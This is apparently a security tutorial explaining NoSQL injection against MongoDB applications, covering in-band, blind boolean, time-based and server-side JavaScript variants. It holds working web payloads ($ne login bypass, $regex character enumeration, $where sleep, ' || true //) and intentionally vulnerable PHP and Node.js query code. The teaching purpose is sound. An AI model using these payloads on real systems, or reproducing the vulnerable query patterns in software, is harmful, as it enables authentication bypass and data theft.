---
title: "Introduction to NoSQL Injection Attacks"
date: 2025-02-18
draft: false
description: "Introduction into NoSQL Injection Attacks"
---
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

## <i class="fa-solid fa-syringe text-primary-400"></i> Overview
<span class="text-primary-400">NoSQL</span> databases like MongoDB, Couchbase, and Cassandra have gained immense popularity due to their flexibility, scalability, and performance benefits over traditional relational databases. However, with this rise in adoption comes an increase in security vulnerabilities. NoSQL injection attacks occur when <span class="text-primary-400">untrusted user input is improperly handled and executed</span> within a NoSQL query, allowing an attacker to manipulate database operations. These vulnerabilities are <span class="text-primary-400">as dangerous as traditional SQL injections</span> but are often overlooked due to the misconception that NoSQL databases are inherently secure.

## <i class="fa-solid fa-compass text-primary-400"></i> Types of NoSQL Injection
NoSQL injection attacks can be categorized based on how the attacker interacts with the database and the feedback received. Understanding these types is crucial for both developers and security professionals to identify and mitigate potential threats.

### In-Band Injection
In-Band Injection involves the attacker using the <span class="text-primary-400">same communication channel</span> to both launch the attack and gather results. This method is straightforward because the feedback is immediate.

<b class="text-primary-400">Example Scenario</b>: Consider a web application using MongoDB that accepts user login credentials via an HTTP `POST` request. The vulnerable PHP code might look like this:

```php
// Vulnerable PHP code
$collection->find([
    'username' => $_POST['username'],
    'password' => $_POST['password']
]);

$collection->find($query);
```

An attacker can craft an HTTP request to exploit this unsanitized input:

{{< highlight http "linenos=false,hl_lines=5" >}}
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=null
{{< /highlight >}}

<b class="text-primary-400">Explanation</b>: PHP Array Syntax -- When writing MongoDB queries in PHP, arrays represent MongoDB’s query structure. The syntax `password[$ne]=null` translates to an associative array in PHP:

```php
$query = [
    'password' => [
        '$ne' => null
    ]
];
```

Resulting Query:

```php
db.users.findOne({
    username: "admin",
    password: { "$ne": null }
});
```

Since the password is <span class="text-primary-400">not null</span>, the condition is <span class="text-primary-400">true</span>, and the attacker gains unauthorized access as the admin.

### Blind Injection
Blind Injections occur when an attacker <span class="text-primary-400">cannot see the direct results</span> of their injected queries but can <span class="text-primary-400">infer information based on the application’s responses</span>, such as differences in content, HTTP status codes, error messages, or response times.

#### Boolean-Based
In a <span class="text-primary-400">Boolean-Based Blind Injection</span>, the attacker sends <span class="text-primary-400">queries that evaluate to either true or false</span> and observes the application’s behavior to infer information about the database.

<b class="text-primary-400">Example Scenario</b>: Consider a search functionality with a NoSQL Injection vulnerability, where users can search for products. An attacker sends a request with a crafted search term:

```HTTP
GET /search.php?search[$regex]=^S.* HTTP/1.1
Host: example.com
```

If a product starting with the letter “<span class="text-primary-400">S</span>” exists:

{{< highlight http "linenos=false,hl_lines=5" >}}
HTTP/1.1 200 OK
Content-Type: text/html

{
  Exists: true
}
{{< /highlight >}}


Otherwise:

{{< highlight http "linenos=false,hl_lines=4" >}}
HTTP/1.1 200 OK
Content-Type: text/html

No products found.
{{< /highlight >}}

To extract the full name of the product, the attacker continues testing each subsequent character to reconstruct the produc name:

```
search[$regex]=^Se.*  ✔️
search[$regex]=^Sea.* ✖️
search[$regex]=^Sec.* ✔️
…
search[$regex]=^SecretProduct$
```

The `$` indicates the end of a string, verifying if the entire word is correct.

#### Time-Based
In a <span class="text-primary-400">Time-Based Blind Injection</span>, the attacker sends queries that cause the server to <span class="text-primary-400">delay its response when certain conditions are true</span>. By measuring these response times, the attacker can infer information about the database.

<b class="text-primary-400">Example Scenario</b>: Assume a NoSQL Injection vulnerability in the username parameter:

```HTTP
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "username": {
       "$where": "function() { if(this.username == 'admin') { sleep(5000); } return true; }"
    },
    "password": "randompassword"
}
```

<b class="text-primary-400">Explanation</b>: JavaScript Function -- The `this` keyword refers to the current document being evaluated in the collection.

```JS
if(this.username == 'admin') { sleep(5000); }
```

<b class="text-primary-400">Behavior</b>: If `this.username == 'admin'` evaluates to true, the function calls `sleep(5000)` to delay the response by 5 seconds, indicating that the username exists. Otherwise, the response time remains normal.

An attacker can enumerate usernames or other fields character by character using a similar method:

```Json
{
    "username": {
        "$where": "function() { if (this.username[0] == 'a') { sleep(5000); } return true; }"
    },
    "password": "irrelevant"
}
```

By systematically testing each character position, the attacker can reconstruct sensitive information.

### Server-Side JavaScript Injection (<span class="text-primary-400">SSJI</span>)
MongoDB allows the use of JavaScript expressions in queries via the `$where` operator. If not handled securely, this feature can be exploited.

<b class="text-primary-400">Example Scenario</b>: Consider the following MongoDB query in a Node.js application:

```JS
collection.findOne({
  $where: `this.username == '${username}' && this.password == '${password}'`
}, function(err, user) {
    if (user) {
        res.send('Logged in as ' + user.username);
    } else {
        res.send('Authentication failed');
    }
});
```

An attacker can manipulate the `username` field to inject malicious code:

```HTTP
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin' || true //&password=anything
```

Resulting Query:

```JS
db.users.findOne({
    $where: "this.username == 'admin' || true // ' && this.password == 'anything'"
});
```

<b class="text-primary-400">Effect</b>: The condition `this.username == 'admin' || true` always evaluates to true, allowing the attacker to bypass authentication.

<b class="text-primary-400">Further Exploitation</b>: Attackers can use injections like `" || ""=="` or `" || true || ""=="` to evaluate the entire query to true. They can also enumerate fields using functions like `match($regex)` and the character-by-character approach mentioned earlier.